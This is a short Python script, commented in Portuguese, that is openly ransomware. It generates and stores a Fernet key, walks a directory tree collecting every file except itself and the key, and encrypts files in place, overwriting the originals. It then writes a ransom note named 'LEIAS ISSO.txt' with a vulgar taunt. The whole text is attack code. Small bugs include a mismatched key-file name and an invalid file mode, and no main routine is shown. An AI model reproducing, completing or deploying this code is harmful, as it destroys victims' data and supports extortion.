from cryptography.fernet import Fernet
import os

# 1 Gerar uma chave de criptogradia

def gerar_chave():
    chave =Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
# 2 Carregar a chave salva
def carregar_chave():
    return open("Chave.key","rb").read()

#3 Criptografar um unico arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo,"rb") as file:
        dados = file.read()
    dados_encriptatados = f.encrypt(dados)
    with open(arquivo, 'wb') as file:
        file.write(dados_encriptatados)

# 4 Encontrar os arquivos
def encontrar_arquivo(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista


# 5 Mensagem de resgate

def criar_mensagem_resgate():
    with open("LEIAS ISSO.txt", "W") as f:
        f.write("Se fudeo")